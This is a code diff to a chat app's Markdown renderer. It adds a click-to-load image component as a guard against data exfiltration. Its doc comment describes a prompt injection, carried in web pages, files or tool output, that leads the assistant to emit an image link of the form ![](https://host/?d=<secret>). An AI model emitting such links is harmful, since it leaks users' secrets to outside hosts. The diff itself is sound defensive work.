@@ -3,7 +3,7 @@
 // app's own window (previewContext.tsx).
 import { Children, Fragment, isValidElement, memo, useMemo, useRef, useState, type ReactNode } from "react";
 import ReactMarkdown, { type Components } from "react-markdown";
-import { Check, Copy } from "lucide-react";
+import { Check, Copy, Image as ImageIcon } from "lucide-react";
 import { PreviewLink } from "./previewContext";
 import { splitBlocks, type Blocks } from "./markdownBlocks";
 import { rehypePlugins, remarkPlugins } from "./markdownPipeline";
@@ -39,6 +39,36 @@ function CodeBlock({ children }: { children?: ReactNode }) {
   );
 }
 
+/**
+ * An image in Markdown. Hermes's replies carry text it read from web pages, files and tool output, so a prompt injection
+ * can ask for `![](https://host/?d=<secret>)`, and loading it would send the secret there. A source on the network is
+ * shown as its host and loads only on a click, which never also follows a link around it (ADR 0099). react-markdown has
+ * already emptied `data:` and other sources it doesn't allow.
+ */
+function MarkdownImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
+  const [load, setLoad] = useState(false);
+  if (!src || load) return <img src={src || undefined} alt={alt} title={title} />;
+  let host = src;
+  try {
+    host = new URL(src, location.href).host || src;
+  } catch {}
+  return (
+    <button
+      type="button"
+      className="md-image"
+      title={src}
+      onClick={(e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        setLoad(true);
+      }}
+    >
+      <ImageIcon size={13} />
+      {alt ? `${alt}: image` : "Image"} from {host}, click to load
+    </button>
+  );
+}
+
 // Made once, not on each render: a new `pre` function would be a new component type to React, which would throw away
 // every code block's DOM and build it again on each streamed delta (#224).
 const components: Components = {
@@ -48,6 +78,7 @@ const components: Components = {
       {children}
     </PreviewLink>
   ),
+  img: ({ src, alt, title }) => <MarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} title={title} />,
 };
 
 /**
